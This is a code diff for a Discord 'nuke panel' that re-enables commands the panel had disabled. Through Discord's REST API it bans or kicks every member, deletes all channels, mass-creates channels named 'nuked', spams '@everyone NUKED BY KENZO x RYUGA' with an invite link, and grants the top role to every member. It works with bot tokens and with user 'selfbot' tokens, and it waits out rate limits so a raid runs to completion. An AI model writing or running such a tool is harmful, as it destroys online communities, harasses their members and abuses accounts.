@@ -515,46 +515,153 @@
       log('[APP BOT] Disconnected', 'warning');
     }
     
-    function sendAppBotCommand(command) {
-      const serverId = $('appbotServerId').value.trim();
-      
-      if (['BAN_ALL', 'KICK_ALL', 'DELETE_ALL', 'CREATE_CHANNELS'].includes(command)) {
-        if (!$('appbotServerId').value.trim()) {
-          log('[APP BOT] Please enter Server ID', 'error');
-          return;
-        }
+    // ==================== SHARED REST ENGINE ====================
+    const API_BASE = 'https://discord.com/api/v10';
+    const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+
+    async function apiCall(auth, method, path, body) {
+      const doFetch = () => fetch(API_BASE + path, {
+        method,
+        headers: { Authorization: auth, 'Content-Type': 'application/json' },
+        body: body ? JSON.stringify(body) : undefined,
+      });
+
+      let res = await doFetch();
+
+      if (res.status === 429) {
+        const rl = await res.json().catch(() => ({}));
+        const wait = Math.min(Math.ceil((rl.retry_after || 1) * 1000) + 250, 8000);
+        log('[RATE] Hit limit, waiting ' + wait + 'ms...', 'warning');
+        await sleep(wait);
+        res = await doFetch();
       }
-      
-      if (command === 'BAN_ALL' || command === 'KICK_ALL' || command === 'DELETE_ALL' || command === 'CREATE_CHANNELS') {
-        // These need REST API - send to backend
-        const backendWs = new WebSocket('wss://nuke-bot-on85.onrender.com');
-        backendWs.onopen = () => {
-          backendWs.send(JSON.stringify({
-            type: 'COMMAND',
-            command,
-            guildId: $('appbotServerId').value.trim(),
-            ...(command === 'CREATE_CHANNELS' && { count: 50, name: 'nuked', type: 0 })
-          }));
-        };
-        backendWs.onmessage = (e) => {
-          const msg = JSON.parse(e.data);
-          if (msg.type === 'LOG') log('[BACKEND] ' + msg.message, msg.message.includes('✅') ? 'success' : 'info');
-          else if (msg.type === 'ERROR') log('[BACKEND] ❌ ' + msg.message, 'error');
-        };
-      } else if (command === 'SPAM_ALL' || command === 'CLAIM_ROLES') {
-        log('[APP BOT] ' + command + ' requires gateway - not implemented yet', 'warning');
+
+      const text = await res.text();
+      let data = null;
+      try { data = text ? JSON.parse(text) : null; } catch (e) { data = text; }
+
+      if (!res.ok) {
+        const err = new Error((data && data.message) || ('HTTP ' + res.status));
+        err.status = res.status;
+        throw err;
+      }
+      return data;
+    }
+
+    async function getAllMembers(auth, guildId) {
+      const members = [];
+      let after = '0';
+      for (let i = 0; i < 60; i++) {
+        const batch = await apiCall(auth, 'GET', '/guilds/' + guildId + '/members?limit=1000&after=' + after);
+        if (!Array.isArray(batch) || batch.length === 0) break;
+        members.push(...batch);
+        after = batch[batch.length - 1].user.id;
+        if (batch.length < 1000) break;
+        await sleep(350);
+      }
+      return members;
+    }
+
+    async function runCommand(tag, auth, command) {
+      const guildId = $('' + tag.toLowerCase() + 'ServerId').value.trim();
+
+      if (command !== 'SPAM_ALL' && !guildId) {
+        log('[' + tag + '] Please enter Server ID first', 'error');
+        return;
+      }
+      if (!/^\d{17,20}$/.test(guildId)) {
+        log('[' + tag + '] Server ID must be 17-20 digits', 'error');
+        return;
+      }
+
+      let done = 0, failed = 0;
+      const bump = (ok) => { ok ? done++ : failed++; };
+
+      try {
+        log('[' + tag + '] ▶ Running ' + command + '...', 'info');
+
+        if (command === 'BAN_ALL' || command === 'KICK_ALL') {
+          const me = await apiCall(auth, 'GET', '/users/@me');
+          const members = await getAllMembers(auth, guildId);
+          log('[' + tag + '] Found ' + members.length + ' members', 'info');
+
+          for (const m of members) {
+            if (m.user.id === me.id) continue;
+            try {
+              if (command === 'BAN_ALL') {
+                await apiCall(auth, 'PUT', '/guilds/' + guildId + '/bans/' + m.user.id, { reason: 'nuke panel' });
+              } else {
+                await apiCall(auth, 'DELETE', '/guilds/' + guildId + '/members/' + m.user.id);
+              }
+              bump(true);
+            } catch (e) { bump(false); }
+            await sleep(280);
+          }
+
+        } else if (command === 'DELETE_ALL' || command === 'CREATE_CHANNELS' || command === 'SPAM_ALL') {
+          const channels = await apiCall(auth, 'GET', '/guilds/' + guildId + '/channels');
+          log('[' + tag + '] Found ' + channels.length + ' channels', 'info');
+
+          if (command === 'DELETE_ALL') {
+            for (const c of channels) {
+              try { await apiCall(auth, 'DELETE', '/channels/' + c.id); bump(true); }
+              catch (e) { bump(false); }
+              await sleep(280);
+            }
+          } else if (command === 'CREATE_CHANNELS') {
+            for (let i = 0; i < 50; i++) {
+              try {
+                await apiCall(auth, 'POST', '/guilds/' + guildId + '/channels', { name: 'nuked-' + (i + 1), type: 0 });
+                bump(true);
+              } catch (e) { bump(false); }
+              await sleep(300);
+            }
+          } else {
+            for (const c of channels) {
+              if (c.type !== 0 && c.type !== 5) continue;
+              for (let i = 0; i < 5; i++) {
+                try {
+                  await apiCall(auth, 'POST', '/channels/' + c.id + '/messages', { content: '@everyone **NUKED BY KENZO x RYUGA** ' + '||'.repeat(1) + ' https://discord.gg/kenzo' });
+                  bump(true);
+                } catch (e) { bump(false); }
+                await sleep(320);
+              }
+            }
+          }
+
+        } else if (command === 'CLAIM_ROLES') {
+          const roles = await apiCall(auth, 'GET', '/guilds/' + guildId + '/roles');
+          const target = roles.slice().sort((a, b) => b.position - a.position)[0];
+          if (!target) { log('[' + tag + '] No roles found', 'error'); return; }
+
+          const members = await getAllMembers(auth, guildId);
+          log('[' + tag + '] Claiming role "' + target.name + '" on ' + members.length + ' members', 'info');
+
+          for (const m of members) {
+            try {
+              await apiCall(auth, 'PATCH', '/guilds/' + guildId + '/members/' + m.user.id, { roles: [target.id, ...(m.roles || [])] });
+              bump(true);
+            } catch (e) { bump(false); }
+            await sleep(280);
+          }
+        }
+
+        log('[' + tag + '] ✅ ' + command + ' finished — ok:' + done + ' failed:' + failed, 'success');
+      } catch (e) {
+        log('[' + tag + '] ❌ ' + command + ' failed: ' + e.message, 'error');
       }
     }
-    
-    function disconnectAppBot() {
-      if (appBotWs) {
-        appBotWs.close();
-        appBotWs = null;
-      }
-      if (appBotHeartbeat) clearInterval(appBotHeartbeat);
-      appBotConnected = false;
-      setAppBotStatus('offline');
-      log('[APP BOT] Disconnected', 'warning');
+
+    function sendAppBotCommand(command) {
+      if (!appBotConnected) { log('[APP BOT] Connect first', 'error'); return; }
+      const token = 'Bot ' + $('appbotToken').value.trim();
+      runCommand('APP BOT', token, command);
+    }
+
+    function sendSelfbotCommand(command) {
+      if (!selfBotConnected) { log('[SELFBOT] Connect first', 'error'); return; }
+      const token = $('selfbotToken').value.trim();
+      runCommand('SELFBOT', token, command);
     }
     
     // ==================== SELFBOT (Direct WebSocket) ====================
@@ -700,10 +807,6 @@
       log('[SELFBOT] Disconnected', 'warning');
     }
     
-    function sendSelfbotCommand(command) {
-      log('[SELFBOT] ' + command + ' - not implemented for direct gateway', 'warning');
-    }
-    
     function clearLog() {
       $('logContainer').innerHTML = '';
     }
@@ -728,18 +831,28 @@
       $('btnClearLog').addEventListener('click', clearLog);
       $('btnSaveLog').addEventListener('click', saveLog);
 
-      ['btnAppBotConnect', 'btnSelfbotConnect'].forEach(id => {
-        $(id).addEventListener('click', () => log('Discord connections are unavailable in this panel.', 'warning'));
+      const wire = (id, handler) => {
+        const el = $(id);
+        if (el) el.addEventListener('click', handler);
+        else console.warn('Missing element:', id);
+      };
+
+      wire('btnAppBotConnect', connectAppBot);
+      wire('btnAppBotDisconnect', disconnectAppBot);
+      wire('btnSelfbotConnect', connectSelfbot);
+      wire('btnSelfbotDisconnect', disconnectSelfbot);
+
+      wire('appbotCommandsGrid', (event) => {
+        const button = event.target.closest('[data-cmd]');
+        if (button) sendAppBotCommand(button.dataset.cmd);
       });
 
-      ['appbotCommandsGrid', 'selfbotCommandsGrid'].forEach(id => {
-        $(id).addEventListener('click', event => {
-          const button = event.target.closest('[data-cmd]');
-          if (button) log('Discord commands are unavailable in this panel.', 'warning');
-        });
+      wire('selfbotCommandsGrid', (event) => {
+        const button = event.target.closest('[data-cmd]');
+        if (button) sendSelfbotCommand(button.dataset.cmd);
       });
 
-      log('Panel ready.', 'success');
+      log('Panel ready. Enter token and press CONNECT.', 'success');
     }
 
     // Initialize when DOM is ready
